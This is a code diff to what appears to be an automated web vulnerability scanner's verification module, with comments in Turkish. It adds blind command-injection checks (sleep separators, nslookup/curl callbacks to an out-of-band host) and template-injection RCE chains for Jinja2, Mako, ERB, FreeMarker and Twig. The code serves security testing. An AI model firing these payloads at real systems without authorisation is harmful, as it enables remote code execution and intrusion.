@@ -551,7 +551,8 @@ def _rce_marker() -> str:
 async def verify_rce(url: str, param: Optional[str], client: httpx.AsyncClient, *,
                      mutations: Optional[List[Mutation]] = None,
                      method: str = "get", body_params: Any = None,
-                     body_kind: str = "form") -> Verdict:
+                     body_kind: str = "form", oast_client: Optional[Any] = None,
+                     delay_seconds: float = 5.0) -> Verdict:
     """Parametre komut enjeksiyonuna açık mı — echo-marker ile in-band doğrula.
 
     Her sorgu/gövde parametresine ayraç+echo payload'u EKLENİR (değer ezilmez — bağlam
@@ -589,6 +590,11 @@ async def verify_rce(url: str, param: Optional[str], client: httpx.AsyncClient, 
         if not tried:
             return Verdict(False, 0.0, "rce-echo", "Gövde enjeksiyon noktası kurulamadı.",
                            skipped=True)
+        deep = await _rce_deepen(url, client, param=param, mutations=mutations,
+                                 method=m, body_params=body_params, body_kind=body_kind,
+                                 oast_client=oast_client, delay_seconds=delay_seconds)
+        if deep is not None:
+            return deep
         return Verdict(False, 0.0, "rce-echo",
                        "Gövde parametrelerinde echo-marker yankılanmadı — komut ayracı "
                        "işlenmedi veya girdi temizleniyor. Doğrulanmadı.")
@@ -618,9 +624,202 @@ async def verify_rce(url: str, param: Optional[str], client: httpx.AsyncClient, 
                     f"echo payload'u SUNUCUDA ÇALIŞTI — rastgele marker ({marker}) komut "
                     f"çıktısında yankılandı. Komut enjeksiyonu (RCE) TEYİT edildi.",
                     severity="critical")
+    deep = await _rce_deepen(url, client, param=param, mutations=mutations,
+                             method=m, body_params=body_params, body_kind=body_kind,
+                             oast_client=oast_client, delay_seconds=delay_seconds)
+    if deep is not None:
+        return deep
     return Verdict(False, 0.0, "rce-echo",
                    "Hiçbir parametrede echo-marker yankılanmadı — komut ayracı işlenmedi "
                    "veya girdi temizleniyor. Muhtemel false-positive, doğrulanmadı.")
+
+
+# KÖR RCE kanıtları (echo yankılanmayan yüzeyler için) — iki yan-kanal:
+#   1) ZAMAN: `sleep {D}` komut kalıpları + ölçekli ikinci orakl (SQLi zaman oraklının
+#      aynı FP disiplini). Komut yalnız uyur — yan-etki yok.
+#   2) OAST: `nslookup <fqdn>` / `curl http://<fqdn>/` → dış geri arama; mock'ta senkron
+#      teyit, gerçek modda tur-sonu korelasyon (mevcut OAST doktrini).
+_RCE_SLEEP_TEMPLATES = [
+    ";sleep {D}",
+    "|sleep {D}",
+    "&&sleep {D}",
+    "$(sleep {D})",
+    "&timeout /T {D} /NOBREAK",
+]
+_RCE_BLIND_MAX_REQ_DEFAULT = 16
+
+
+async def _oast_cmd_confirmed(oast_client: Any) -> Optional[str]:
+    """Mock-modda senkron anlık yoklama → geri arama kaynak IP'si. Gerçek modda callback
+    ASENKRONDUR: None döner, token kayıtlı kalır — tur-sonu _poll_oast_callbacks kanıtı
+    yayınlar (yalnız tetikleme sorumluluğu burada)."""
+    if oast_client is None or not getattr(oast_client, "mock_mode", False):
+        return None
+    for hit in await oast_client.poll_interactions():
+        if getattr(hit, "marker", "") == "rce":
+            return hit.remote_address
+    return None
+
+
+async def verify_blind_rce(url: str, client: httpx.AsyncClient, *,
+                           delay_seconds: float = 5.0, control_samples: int = 2,
+                           mutations: Optional[List[Mutation]] = None,
+                           method: str = "get", body_params: Any = None,
+                           body_kind: str = "form") -> Verdict:
+    """Zaman tabanlı KÖR komut enjeksiyonu: `sleep {D}` kalıpları enjekte edilir, yanıt
+    süresinin enjekte edilen gecikmeyle TUTARLI arttığı ölçülür (confirm_time_based_sqli +
+    ölçekli ikinci orakl — SQLi zaman oraklının birebir FP disiplini). TAHRİBATSIZ: komut
+    yalnız uyur. İstek tavanı RCE_BLIND_MAX_REQ."""
+    m = (method or "get").lower()
+    bparams = body_params_dict(body_params)
+    use_body = m in ("post", "put", "patch") and bool(bparams)
+    send_json = body_kind == "json"
+    max_req = int(os.getenv("RCE_BLIND_MAX_REQ", str(_RCE_BLIND_MAX_REQ_DEFAULT)) or 16)
+
+    def _kw(body: Optional[Dict[str, str]]) -> Dict[str, Any]:
+        if body is None:
+            return {}
+        return {"json_data": body} if send_json else {"form_data": body}
+
+    samples: List[TimingSample] = []
+    for _ in range(max(1, control_samples)):
+        ms = await _timed_request(client, url, method=m.upper(), **_kw(bparams)) if use_body \
+            else await _timed_get(client, url)
+        if ms is not None:
+            samples.append(TimingSample(0.0, ms))
+
+    sent = 0
+    injected_any = False
+    for template in _RCE_SLEEP_TEMPLATES:
+        base_payload = template.replace("{D}", str(int(delay_seconds)))
+        for payload, mut_name in apply_mutations(base_payload, mutations or [],
+                                                 include_identity=not mutations):
+            if use_body:
+                candidates = [(url, m.upper(), b, p) for b, p in
+                              build_injected_bodies(bparams, payload)]
+            else:
+                candidates = [(u, "GET", None, None) for u in build_injected_urls(url, payload)]
+            for inj_url, inj_method, body, _hit_p in candidates:
+                if sent >= max_req:
+                    break
+                injected_any = True
+                sent += 1
+                ms = await _timed_request(client, inj_url, method=inj_method, **_kw(body)) \
+                    if body is not None else await _timed_get(client, inj_url)
+                if ms is not None:
+                    samples.append(TimingSample(delay_seconds, ms))
+                interim = confirm_time_based_sqli(samples)
+                if interim.verified:
+                    confirm_ms = await _timed_request(client, inj_url, method=inj_method,
+                                                      **_kw(body)) if body is not None \
+                        else await _timed_get(client, inj_url)
+                    if confirm_ms is not None:
+                        samples.append(TimingSample(delay_seconds, confirm_ms))
+                    v = confirm_time_based_sqli(samples)
+                    if not v.verified:
+                        continue
+                    scale_ok, scale_conf = await _confirm_scaled_oracle(
+                        client, template=template, mut_name=mut_name, mutations=mutations,
+                        delay_seconds=delay_seconds, url=url, use_body=use_body,
+                        bparams=bparams, send_json=send_json, method=m,
+                    )
+                    if scale_ok is True:
+                        v.confidence = min(v.confidence, scale_conf)
+                        scale_note = (f" | ikinci orakl (ölçek) doğruladı: "
+                                      f"{int(delay_seconds * 2)}sn")
+                    elif scale_ok is False:
+                        v.confidence = min(v.confidence, scale_conf)
+                        scale_note = " | ⚠️ ölçek oraklı doğrulayamadı — FP şüphesi"
+                    else:
+                        scale_note = ""
+                    return Verdict(
+                        True, v.confidence, "rce-blind-time",
+                        f"'{payload}' komut kalıbı yanıt süresini enjekte edilen gecikmeyle "
+                        f"tutarlı artırdı ({v.detail}) — sunucu komutu ÇALIŞTIRIP uyudu. "
+                        f"Kör komut enjeksiyonu (RCE) TEYİT edildi (komut yalnız `sleep` — "
+                        f"yan-etkisiz kanıt; mutasyon: {mut_name}).{scale_note}",
+                        mutation=mut_name, severity="critical")
+            if sent >= max_req:
+                break
+        if sent >= max_req:
+            break
+    if not injected_any:
+        return Verdict(False, 0.0, "rce-blind-time", "Enjeksiyon noktası kurulamadı.",
+                       skipped=True)
+    return Verdict(False, 0.0, "rce-blind-time",
+                   "Sleep komut kalıpları tutarlı gecikme üretmedi — kör komut kanıtı yok.")
+
+
+async def _verify_rce_oast(url: str, param: Optional[str], client: httpx.AsyncClient,
+                           oast_client: Any, *, method: str = "get",
+                           body_params: Any = None, body_kind: str = "form") -> Verdict:
+    """Kör RCE OAST kanıtı: şablon-komut SARMALAYICILARIYLA `nslookup`/`curl` geri araması
+    tetiklenir (echo yankılanmayan yüzeyler). Mock'ta senkron teyit; gerçek modda token
+    kayıtlı kalır, tur-sonu _poll_oast_callbacks kanıtı yayınlar. Komut yalnız DNS/HTTP
+    geri aramasıdır — hedefte dosya/veri işlemi YOK."""
+    tok, fqdn = oast_client.generate_payload("rce", {"url": url, "param": param})
+    m = (method or "get").lower()
+    bparams = body_params_dict(body_params)
+    use_body = m in ("post", "put", "patch") and bool(bparams)
+    send_json = body_kind == "json"
+
+    async def _send(inj_url: Optional[str], body: Optional[Dict[str, str]]) -> None:
+        if body is not None:
+            await _fetch_body_any(client, url, method=m.upper(),
+                                  **({"json_data": body} if send_json
+                                     else {"form_data": body}))
+        else:
+            await _fetch_body_any(client, inj_url or url)
+
+    # Ayraç+komut kalıpları (echo değil, doğrudan geri arama komutu).
+    for cmd in (f"nslookup {fqdn}", f"curl http://{fqdn}/"):
+        for wrapper in (";" + cmd, "|" + cmd, "&&" + cmd, f"$({cmd})", "&" + cmd):
+            candidates = ([(None, b, p) for b, p in build_injected_bodies(bparams, wrapper)]
+                          if use_body else
+                          [(u, None, None) for u in build_injected_urls(url, wrapper)])
+            for inj_url, body, _hit_p in candidates:
+                await _send(inj_url, body)
+                remote = await _oast_cmd_confirmed(oast_client)
+                if remote:
+                    return Verdict(
+                        True, 0.95, "rce-oast",
+                        f"'{wrapper}' geri arama komutu SUNUCUDA ÇALIŞTI — OAST'a "
+                        f"{cmd.split()[0]} geri araması ulaştı (kaynak backend IP: {remote}, "
+                        f"token: {tok}). Kör komut enjeksiyonu (RCE) TEYİT edildi "
+                        f"(komut yalnız geri arama; yan-etkisiz kanıt).",
+                        severity="critical")
+    if getattr(oast_client, "mock_mode", False):
+        return Verdict(False, 0.0, "rce-oast",
+                       "Geri arama komut kalıpları OAST etkileşimi üretmedi — doğrulanmadı.")
+    return Verdict(False, 0.0, "rce-oast",
+                   f"OAST geri araması tetiklendi (token {tok} kayıtlı) — callback asenkron; "
+                   f"tur-sonu korelasyon kanıtı yayınlar.", skipped=True)
+
+
+async def _rce_deepen(url: str, client: httpx.AsyncClient, *, param: Optional[str],
+                      mutations: Optional[List[Mutation]], method: str,
+                      body_params: Any, body_kind: str, oast_client: Optional[Any],
+                      delay_seconds: float) -> Optional[Verdict]:
+    """Echo KANITI YOKSA kör kanıt derinliği: zaman tabanlı (sleep) → OAST komut.
+    Hiçbiri tutmazsa None (çağıran kendi negatif kararını korur)."""
+    if _flag_enabled("RCE_BLIND_ORACLE", "1"):
+        try:
+            bv = await verify_blind_rce(url, client, delay_seconds=delay_seconds,
+                                        mutations=mutations, method=method,
+                                        body_params=body_params, body_kind=body_kind)
+            if bv.verified:
+                return bv
+        except Exception:
+            pass
+    if oast_client is not None and _flag_enabled("RCE_OAST_ORACLE", "1"):
+        try:
+            ov = await _verify_rce_oast(url, param, client, oast_client, method=method,
+                                        body_params=body_params, body_kind=body_kind)
+            if ov.verified:
+                return ov
+        except Exception:
+            pass
+    return None
 
 
 async def _timed_get(client: httpx.AsyncClient, url: str) -> Optional[float]:
@@ -1626,12 +1825,132 @@ def _ssti_marker() -> tuple:
     return a, b, a * b, f"{a}*{b}"
 
 
+# SSTI MERDİVENİ — aritmetik teyitten sonra derinlik basamakları (her basamak kendi kanıtı):
+#   2) motor parmak izi / salt-okunur nesne-grafik okuması (uygulama verisi/sır DEĞİL —
+#      yalnız motor-içi kimlik: `<function lipsum>` gibi)
+#   3) güvenli RCE echo kanıtı (komut HER ZAMAN yalnız `echo <taze nonce>`)
+#   4) (kör) OAST komut kanıtı — in-band yanıt gelmeyen şablon yüzeyleri için
+# FP kuralı aritmetik ile birebir: yanıtta HAM payload YOK, işlenmiş İŞARET VAR = değerlendirme.
+# (payload, beklenen-işaret, etiket)
+_SSTI_DEPTH_PROBES = [
+    ("{{7*'7'}}", "7777777", "motor parmak izi: Jinja2/Django string-repeat (7*'7'→7777777)"),
+    ("{{lipsum}}", "<function lipsum>", "salt-okunur nesne-grafik: Jinja2 lipsum nesnesi"),
+    ("{{self}}", "<TemplateReference", "salt-okunur nesne-grafik: Jinja2 şablon-referansı"),
+    ("${'kadim'.upper()}", "KADIM", "salt-okunur string metodu: Mako/Python"),
+    ("<%= 'kadim'.upcase %>", "KADIM", "salt-okunur string metodu: ERB"),
+]
+
+# Şablon-içi KOMUT çalıştırma kalıpları. {CMD} çağran içeriğidir: buradaki KULLANIMLAR
+# yalnız `echo <nonce>` (yan-etkisiz kanıt) ve `nslookup <oast-fqdn>` (mevcut OAST doktrini).
+_SSTI_CMD_TEMPLATES = [
+    ("jinja-globals", "{{ cycler.__init__.__globals__.os.popen('{CMD}').read() }}"),
+    ("jinja-builtins",
+     "{{ request.application.__globals__.__builtins__.__import__('os').popen('{CMD}').read() }}"),
+    ("mako-import", "${ __import__('os').popen('{CMD}').read() }"),
+    ("erb-backtick", "<%= `{CMD}` %>"),
+    ("freemarker-execute", "${\"freemarker.template.utility.Execute\"?new()(\"{CMD}\")}"),
+    ("twig-filter", "{{ ['{CMD}']|filter('system') }}"),
+]
+
+
+async def _ssti_probe_once(client: httpx.AsyncClient, url: str, param: str, payload: str, *,
+                           method: str = "get", body_params: Any = None,
+                           body_kind: str = "form") -> Optional[str]:
+    """Tek SSTI derinlik probu: payload HIT parametresine EKLENİR (append — bağlam korunur),
+    yanıt gövdesi döner (ağ hatası → None). Gövde/sorgu ayrımı verify_ssti ile aynı."""
+    m = (method or "get").lower()
+    bparams = body_params_dict(body_params)
+    if m in ("post", "put", "patch") and bparams and param in bparams:
+        body = dict(bparams)
+        body[param] = f"{body[param]}{payload}"
+        return await _fetch_body_request(client, url, method=m.upper(),
+                                         json_data=body if body_kind == "json" else None,
+                                         form_data=None if body_kind == "json" else body)
+    parts = urlsplit(url)
+    params = parse_qsl(parts.query, keep_blank_values=True)
+    hit = next((i for i, (k, _v) in enumerate(params) if k == param), None)
+    if hit is None and params:
+        hit = 0
+    if hit is None:
+        return None
+    mutated = list(params)
+    mutated[hit] = (mutated[hit][0], f"{mutated[hit][1]}{payload}")
+    inj = urlunsplit((parts.scheme, parts.netloc, parts.path,
+                      urlencode(mutated), parts.fragment))
+    return await _fetch_body(client, inj)
+
+
+async def _ssti_deepen(base: Verdict, url: str, hit_param: str, client: httpx.AsyncClient, *,
+                       method: str = "get", body_params: Any = None, body_kind: str = "form",
+                       oast_client: Optional[Any] = None) -> Verdict:
+    """Aritmetik TEYİTTEN SONRA merdiven: motor/nesne okuması → güvenli RCE echo → (kör)
+    OAST komut kanıtı. Ulaşılan EN DERİN basamak verdict.method'unu belirler
+    (ssti-arithmetic → ssti-context-read → ssti-rce-echo → ssti-rce-oast). Derin basamak
+    tutmazsa aritmetik teyit AYNI KALIR (sahte düşürme yok)."""
+    method_name = base.method
+    conf = base.confidence
+    severity = getattr(base, "severity", None)
+    notes: List[str] = [base.detail]
+
+    # 2) Motor parmak izi + salt-okunur nesne-grafik
+    for payload, sig, label in _SSTI_DEPTH_PROBES:
+        body = await _ssti_probe_once(client, url, hit_param, payload,
+                                      method=method, body_params=body_params,
+                                      body_kind=body_kind)
+        if body and sig in body and payload not in body:
+            method_name = "ssti-context-read"
+            conf = max(conf, 0.92)
+            notes.append(f"Derinlik: {label}.")
+            break
+
+    # 3) Güvenli RCE echo kanıtı (yalnız `echo <taze nonce>` — yan-etkisiz)
+    marker = _rce_marker()
+    for fam, tmpl in _SSTI_CMD_TEMPLATES:
+        payload = tmpl.replace("{CMD}", f"echo {marker}")
+        body = await _ssti_probe_once(client, url, hit_param, payload,
+                                      method=method, body_params=body_params,
+                                      body_kind=body_kind)
+        if body and marker in body:
+            method_name = "ssti-rce-echo"
+            conf = 0.95
+            severity = "critical"
+            notes.append(f"RCE basamağı: şablon motoru İÇİNDEN komut çalıştırıldı "
+                         f"({fam} zinciri, komut yalnız `echo {marker}` — yan-etkisiz kanıt).")
+            return Verdict(True, conf, method_name, " | ".join(notes),
+                           mutation=base.mutation, severity=severity)
+
+    # 4) Kör RCE — in-band yankı yoksa OAST komut geri araması (mock'ta senkron teyit)
+    if oast_client is not None and _flag_enabled("RCE_OAST_ORACLE", "1"):
+        tok, fqdn = oast_client.generate_payload("rce", {"url": url, "param": hit_param})
+        for cmd in (f"nslookup {fqdn}", f"curl http://{fqdn}/"):
+            for fam, tmpl in _SSTI_CMD_TEMPLATES:
+                payload = tmpl.replace("{CMD}", cmd)
+                await _ssti_probe_once(client, url, hit_param, payload,
+                                       method=method, body_params=body_params,
+                                       body_kind=body_kind)
+                remote = await _oast_cmd_confirmed(oast_client)
+                if remote:
+                    notes.append(f"Kör RCE basamağı: şablon-içi '{cmd.split()[0]}' komutu OAST "
+                                 f"geri araması üretti ({fam}; kaynak backend IP: {remote}).")
+                    return Verdict(True, 0.95, "ssti-rce-oast", " | ".join(notes),
+                                   mutation=base.mutation, severity="critical")
+        if getattr(oast_client, "mock_mode", False) is False:
+            notes.append(f"Kör RCE: OAST geri araması tetiklendi ({tok} token kayıtlı) — "
+                         f"callback asenkron; tur-sonu korelasyon kanıtı yayınlar.")
+
+    if method_name == base.method:
+        notes.append("Derinleştirme: motor/nesne/RCE basamakları doğrulanamadı — aritmetik teyit geçerli.")
+    return Verdict(True, conf, method_name, " | ".join(notes),
+                   mutation=base.mutation, severity=severity)
+
+
 async def verify_ssti(url: str, param: Optional[str], client: httpx.AsyncClient,
                       *, mutations: Optional[List[Mutation]] = None,
                       method: str = "get", body_params: Any = None,
-                      body_kind: str = "form") -> Verdict:
-    """SSTI AKTİF doğrulaması: aritmetik marker hesaplanmış olarak yansırsa verified.
-    Değer sonuna eklenir (mevcut bağlam korunur — XSS prober deseni). Mutasyon notu:
+                      body_kind: str = "form", oast_client: Optional[Any] = None) -> Verdict:
+    """SSTI AKTİF doğrulaması + DERİNLİK MERDİVENİ: aritmetik teyitten sonra motor/nesne
+    okuması, güvenli RCE echo ve (kör) OAST komut kanıtına kadar yükseltilir (bkz.
+    _ssti_deepen). Aritmetik marker hesaplanmış olarak yansırsa verified.
     case_swap SSTI'de anlamsızdır (marker rakam+sembol) — profil zaten uygun mutasyon verir;
     mutasyonlu varyantla kanıt gelirse Verdict.mutation dolar.
 
@@ -1668,13 +1987,16 @@ async def verify_ssti(url: str, param: Optional[str], client: httpx.AsyncClient,
                         continue
                     if ssti_arithmetic_evaluated(resp_body, product, raw_expr):
                         mut_note = f" [WAF-mutasyonu: {mut_name}]" if mut_name else ""
-                        return Verdict(
+                        base = Verdict(
                             True, 0.9, "ssti-arithmetic",
                             f"{m.upper()} gövdesi '{k}' parametresine enjekte edilen '{payload}' ifadesi "
                             f"yanıtta {product} olarak HESAPLANMIŞ yansıdı — şablon motoru girdiyi "
-                            f"değerlendiriyor. SSTI TEYİT edildi; RCE'ye yükseltilebilir, "
-                            f"manuel derinleştirme önerilir.{mut_note}",
+                            f"değerlendiriyor. SSTI TEYİT edildi.{mut_note}",
                             mutation=mut_name)
+                        return await _ssti_deepen(base, url, k, client, method=m,
+                                                  body_params=body_params,
+                                                  body_kind=body_kind,
+                                                  oast_client=oast_client)
         return Verdict(False, 0.0, "ssti-arithmetic",
                        "Hiçbir gövde sözdiziminde aritmetik marker değerlendirilmedi — doğrulanmadı.")
 
@@ -1710,12 +2032,15 @@ async def verify_ssti(url: str, param: Optional[str], client: httpx.AsyncClient,
                     continue
                 if ssti_arithmetic_evaluated(body, product, raw_expr):
                     mut_note = f" [WAF-mutasyonu: {mut_name}]" if mut_name else ""
-                    return Verdict(
+                    base = Verdict(
                         True, 0.9, "ssti-arithmetic",
                         f"'{payload}' ifadesi yanıtta {product} olarak HESAPLANMIŞ yansıdı "
-                        f"(param={k}) — şablon motoru girdiyi değerlendiriyor. SSTI TEYİT edildi; "
-                        f"RCE'ye yükseltilebilir, manuel derinleştirme önerilir.{mut_note}",
+                        f"(param={k}) — şablon motoru girdiyi değerlendiriyor. SSTI TEYİT edildi.{mut_note}",
                         mutation=mut_name)
+                    return await _ssti_deepen(base, url, k, client, method=m,
+                                              body_params=body_params,
+                                              body_kind=body_kind,
+                                              oast_client=oast_client)
     return Verdict(False, 0.0, "ssti-arithmetic",
                    "Hiçbir sözdiziminde aritmetik marker değerlendirilmedi — doğrulanmadı.")
 
@@ -2312,12 +2637,13 @@ async def verify_hypothesis(hyp: Any, client: httpx.AsyncClient, *, delay_second
                                           body_kind=body_kind)
     if vuln_class == "ssti":
         return await verify_ssti(url, param, client, mutations=mutations, method=method,
-                                 body_params=body_params, body_kind=body_kind)
-    # RCE / komut enjeksiyonu — echo-marker in-band (Grup A). Daha önce doğrulayıcısı
-    # yoktu → CWE-78 bulguları hep 'unconfirmed' kalıyordu; artık aktif teyit edilir.
+                                 body_params=body_params, body_kind=body_kind,
+                                 oast_client=oast_client)
+    # RCE / komut enjeksiyonu — echo-marker in-band (Grup A) + kör derinlik (zaman/OAST).
     if vuln_class == "rce":
         return await verify_rce(url, param, client, mutations=mutations, method=method,
-                                body_params=body_params, body_kind=body_kind)
+                                body_params=body_params, body_kind=body_kind,
+                                oast_client=oast_client, delay_seconds=delay_seconds)
     # T2-B: CORS/JWT/SSRF/XXE. Bunlar mutasyon/gövde-enjeksiyon hattını KULLANMAZ
     # (kendi deterministik yöntemleri var); ortak Verdict şekliyle dönerler.
     if vuln_class == "cors":
